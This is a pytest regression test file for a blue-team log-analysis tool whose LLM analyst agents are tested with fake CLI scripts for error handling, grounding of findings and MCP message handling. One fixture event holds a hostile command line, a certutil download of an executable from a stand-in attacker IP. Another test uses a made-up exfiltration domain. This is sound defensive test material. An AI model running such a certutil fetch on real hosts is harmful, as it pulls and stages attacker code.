# Bastion AI - Blue-Team Log Intelligence
# Author: Harikishore Karunanithi | SPDX-License-Identifier: MIT
# WATERMARK: BASTION::AUTHOR::Harikishore-Karunanithi
"""Regression tests for agent-layer fixes (A1-A7, M1-M3). Offline: every
`claude` here is a fake shell script on PATH."""
import json
import os
import stat
import subprocess
import sys

import pytest

from conftest import SAMPLES
from bastion.ingest import ingest_path
from bastion.models import Event
from bastion.pipeline import normalize, map_attack, correlate, extract_iocs, compress
from bastion.agents import AgentContext
from bastion.agents.grounding import evidence_index, check_text
from bastion.agents.mcp_server import handle
from bastion.agents.roles import JuniorSocAnalyst, SeniorSocAnalyst, ThreatHunter
from bastion.agents.runtime import SwarmSession, _run_cli
from bastion.agents.toolbox import Blackboard, SecurityToolbox
from bastion.llm.backbone import LLMBackbone, BackboneUnavailable

SRC = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "src")
LIMIT = "You've hit your session limit · resets 5pm"


def _ctx(backbone=None):
    events = normalize(ingest_path(SAMPLES))
    map_attack(events)
    return AgentContext(events=events, incidents=correlate(events, window_minutes=120),
                        iocs=extract_iocs(events), digest=compress(events),
                        backbone=backbone)


def _box(tmp_path, ctx=None):
    ctx = ctx or _ctx()
    return ctx, SecurityToolbox(ctx, "t", "Tester", Blackboard(str(tmp_path / "b.jsonl")))


def _fake_claude(tmp_path, monkeypatch, body: str):
    bindir = tmp_path / "bin"
    bindir.mkdir(exist_ok=True)
    exe = bindir / "claude"
    exe.write_text("#!/bin/sh\n" + body)
    exe.chmod(exe.stat().st_mode | stat.S_IEXEC)
    monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
    return exe


# ---- A1: non-zero exit reason comes from stdout when stderr is empty ---------
def test_a1_backbone_cli_error_uses_stdout(tmp_path, monkeypatch):
    _fake_claude(tmp_path, monkeypatch, f'echo "{LIMIT}"\nexit 1\n')
    with pytest.raises(BackboneUnavailable) as exc:
        LLMBackbone(mode="cli").complete("hi")
    assert "session limit" in str(exc.value)


def test_a1_runtime_cli_error_uses_stdout(tmp_path, monkeypatch):
    _fake_claude(tmp_path, monkeypatch, 'echo "boom: not logged in"\nexit 1\n')
    session = SwarmSession(_ctx(), seed=[])
    try:
        run = _run_cli(ThreatHunter(), session, LLMBackbone(mode="cli"), 2, 30)
    finally:
        session.close()
    assert run["error"] == "claude exited 1: boom: not logged in"


# ---- A2: is_error wording, empty summary, and the swarm stop flag -----------
_STREAM_LIMIT = (
    "echo x >> \"$COUNT_LOG\"\n"
    "echo '{\"type\":\"result\",\"subtype\":\"success\",\"is_error\":true,"
    "\"result\":\"" + LIMIT.replace("'", "'\"'\"'") + "\",\"num_turns\":1}'\n"
    "exit 1\n")


def test_a2_agent_error_wording_and_empty_summary(tmp_path, monkeypatch):
    monkeypatch.setenv("COUNT_LOG", str(tmp_path / "count.log"))
    _fake_claude(tmp_path, monkeypatch, _STREAM_LIMIT)
    session = SwarmSession(_ctx(), seed=[])
    try:
        run = _run_cli(ThreatHunter(), session, LLMBackbone(mode="cli"), 2, 30)
    finally:
        session.close()
    assert run["error"] == f"agent error: {LIMIT}"
    assert "success" not in run["error"]
    assert run["summary"] == ""


def test_a2_usage_limit_stops_later_agents(tmp_path, monkeypatch):
    count = tmp_path / "count.log"
    monkeypatch.setenv("COUNT_LOG", str(count))
    _fake_claude(tmp_path, monkeypatch, _STREAM_LIMIT)
    ctx = _ctx(LLMBackbone(mode="cli"))
    session = SwarmSession(ctx, seed=[])
    try:
        first, second = ThreatHunter(), JuniorSocAnalyst("dns")
        first.run(ctx, session=session)
        assert session.halted and "limit" in session.halted
        second.run(ctx, session=session)
    finally:
        session.close()
    assert len(count.read_text().splitlines()) == 1     # second agent never launched claude
    assert second.last_run["mode"] == "fallback (rules)"
    assert second.last_run["error"].startswith("skipped: model limit hit by")


# ---- A3: a verdict only decides candidates of its own incident ---------------
def _two_incident_ctx():
    c = _ctx()
    for w in (60, 30, 10, 5, 2, 1):
        incs = correlate(c.events, window_minutes=w)
        if len(incs) >= 2:
            break
    c.incidents = incs
    c.backbone = object()
    return c


def test_a3_verdict_does_not_touch_other_incidents(tmp_path):
    c = _two_incident_ctx()
    tier1 = [f for src in sorted({e.source for e in c.events})
             for f in JuniorSocAnalyst(src).run(c, use_llm=False)]
    a, b = c.incidents[0], c.incidents[1]
    assert any(f.incident_id == b.id for f in tier1)
    every = [f.id for f in tier1]
    verdicts = [
        {"incident_id": a.id, "decision": "dismissed", "severity": "low",
         "confidence": 0.8, "rationale": "benign", "evidence": [a.events[0].event_id],
         "reviewed_candidates": every},
        {"incident_id": b.id, "decision": "confirmed", "severity": "high",
         "confidence": 0.9, "rationale": "real", "evidence": [b.events[0].event_id],
         "reviewed_candidates": every},
    ]
    senior = SeniorSocAnalyst(name="soc2-lead")

    def fake_investigate(ctx, session):
        senior.verdicts = verdicts
        senior.last_run = {"mode": "autonomous"}
        return []
    senior.investigate = fake_investigate
    senior.verify(c, tier1, use_llm=True, session=object())
    for f in tier1:
        if f.incident_id == a.id:
            assert f.status == "dismissed"
        elif f.incident_id == b.id:
            assert f.status == "confirmed"


def test_a3_rule_verdict_does_not_duplicate_verified_by():
    c = _two_incident_ctx()
    inc = c.incidents[0]
    cands = [f for src in sorted({e.source for e in c.events})
             for f in JuniorSocAnalyst(src).run(c, use_llm=False)
             if f.incident_id == inc.id]
    senior = SeniorSocAnalyst(name="soc2-lead")
    senior._rule_verdict(inc, cands)
    senior._rule_verdict(inc, cands)
    assert all(c.verified_by == ["soc2-lead"] for c in cands)


# ---- A4: indicators only in the raw record are grounded ----------------------
def _raw_event():
    return Event(ts="2026-09-26T09:07:02Z", source="edr", category="process",
                 action="process_create", message="certutil download", host="web01",
                 raw={"command_line": "certutil -urlcache -f http://198.51.100.7/t.exe",
                      "md5": "0123456789abcdef0123456789abcdef",
                      "referrer": "dl.payload-host.example"})


def test_a4_raw_record_indicators_are_grounded(tmp_path):
    e = _raw_event()
    ctx = AgentContext(events=[e], incidents=[], iocs={}, digest="")
    _, box = _box(tmp_path, ctx)
    res = json.loads(box.call("submit_finding", {
        "title": "certutil pulled payload from 198.51.100.7", "severity": "high",
        "confidence": 0.8, "evidence": [e.event_id],
        "rationale": "fetched from 198.51.100.7 (dl.payload-host.example); "
                     "md5 0123456789abcdef0123456789abcdef"}))
    assert res.get("accepted") is True, res
    # The analyst path's index agrees.
    assert check_text("198.51.100.7 0123456789abcdef0123456789abcdef",
                      evidence_index([e], []))["ok"]


# ---- A5: the plain-completion CLI call is isolated --------------------------
def test_a5_complete_cli_is_isolated(tmp_path, monkeypatch):
    log = tmp_path / "argv.log"
    monkeypatch.setenv("ARGV_LOG", str(log))
    _fake_claude(tmp_path, monkeypatch,
                 'for a in "$@"; do printf "%s\\n" "$a"; done > "$ARGV_LOG"\n'
                 'echo "cwd=$PWD" >> "$ARGV_LOG"\n'
                 'ls -A | wc -l | tr -d " " | sed "s/^/files=/" >> "$ARGV_LOG"\n'
                 'echo ok\n')
    assert LLMBackbone(mode="cli").complete("hi", system="sys") == "ok"
    lines = log.read_text().splitlines()
    i = lines.index("--tools")
    assert lines[i + 1] == ""
    for flag in ("--strict-mcp-config", "--no-session-persistence"):
        assert flag in lines
    assert lines[lines.index("--setting-sources") + 1] == "project"
    cwd = next(l for l in lines if l.startswith("cwd="))[4:]
    assert os.path.realpath(cwd) != os.path.realpath(os.getcwd())
    assert "files=0" in lines                     # fresh, empty directory
    assert not os.path.exists(cwd)                # and cleaned up afterwards


# ---- A6: malformed MCP messages get JSON-RPC errors, server keeps serving ----
def test_a6_mcp_bad_messages_return_errors(tmp_path):
    _, box = _box(tmp_path)
    out = str(tmp_path / "o.json")
    assert handle([1], box, out)["error"]["code"] == -32600
    bad_name = {"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                "params": {"name": None, "arguments": {}}}
    assert handle(bad_name, box, out)["error"]["code"] == -32602
    bad_params = {"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": [1]}
    assert handle(bad_params, box, out)["error"]["code"] == -32602


def test_a6_mcp_server_survives_bad_lines(tmp_path):
    session = SwarmSession(_ctx(), seed=[])
    try:
        lines = [json.dumps([1]),
                 json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                             "params": {"name": None}}),
                 json.dumps({"jsonrpc": "2.0", "id": 2, "method": "ping"})]
        proc = subprocess.run(
            [sys.executable, "-m", "bastion.agents.mcp_server", "--session",
             session.dir, "--agent", "x", "--role", "r"],
            input="\n".join(lines) + "\n", capture_output=True, text=True,
            env=dict(os.environ, PYTHONPATH=SRC), timeout=60)
    finally:
        session.close()
    assert proc.returncode == 0, proc.stderr
    resp = [json.loads(l) for l in proc.stdout.splitlines()]
    assert [r.get("error", {}).get("code") for r in resp] == [-32600, -32602, None]
    assert resp[2] == {"jsonrpc": "2.0", "id": 2, "result": {}}


# ---- A7: fabricated subdomains of evidence domains are not grounded ----------
def test_a7_fabricated_subdomain_rejected(tmp_path):
    e = Event(ts="2026-09-26T09:00:00Z", source="dns", category="dns",
              action="dns_query", message="query", domain="cdn.evil-update.xyz",
              user="alice@corp.example")
    ctx = AgentContext(events=[e], incidents=[], iocs={}, digest="")
    _, box = _box(tmp_path, ctx)
    res = json.loads(box.call("submit_finding", {
        "title": "Exfil to stage2.exfil-backup.cdn.evil-update.xyz", "severity": "high",
        "confidence": 0.9, "rationale": "beacons", "evidence": [e.event_id]}))
    assert res["error"] == "finding rejected"
    # Exact matches, parents and the user's email domain stay grounded.
    assert box._ungrounded("cdn.evil-update.xyz evil-update.xyz corp.example") == {}


# ---- M1-M3: toolbox argument handling ----------------------------------------
def test_m1_date_only_end_covers_the_whole_day(tmp_path):
    ctx, box = _box(tmp_path)
    day = min(e.ts for e in ctx.events).date().isoformat()
    same_day = sum(1 for e in ctx.events if e.ts.date().isoformat() == day)
    res = json.loads(box.call("search_events", {"start": day, "end": day, "limit": 200}))
    assert res["matches"] == same_day > 0


def test_m2_post_note_none_is_an_error(tmp_path):
    _, box = _box(tmp_path)
    assert "error" in json.loads(box.call("post_note", {"message": None}))
    assert box.board.read() == []


def test_m3_list_iocs_parses_string_booleans(tmp_path):
    _, box = _box(tmp_path)
    everything = json.loads(box.call("list_iocs", {"suspicious_only": False}))
    assert json.loads(box.call("list_iocs", {"suspicious_only": "false"})) == everything
    flagged = json.loads(box.call("list_iocs", {"suspicious_only": "true"}))
    assert all(i.get("suspicious") for items in flagged.values() for i in items)
